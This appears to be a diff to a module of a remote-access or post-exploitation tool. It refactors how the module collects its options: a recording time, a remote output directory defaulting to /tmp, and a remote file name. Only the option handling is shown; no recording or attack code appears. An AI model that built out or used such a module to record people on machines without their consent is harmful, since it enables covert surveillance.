@@ -17,10 +17,17 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        record_time = self._view.prompt("Time in seconds to record [ENTER for 5]: ")
-        output_dir = self._view.prompt("Remote output directory [ENTER for /tmp]: ")
-        output_name = self._view.prompt("Remote output name [ENTER for <RANDOM>]: ")
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "Time in seconds to record (Leave empty for 5): ",
+            "Remote output directory (Leave empty for /tmp): ",
+            "Remote output name (Leave empty for <RANDOM>): "
+        ]
+
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        record_time = set_options[0]
+        output_dir = set_options[1]
+        output_name = set_options[2]
 
         if not record_time:
             record_time = 5
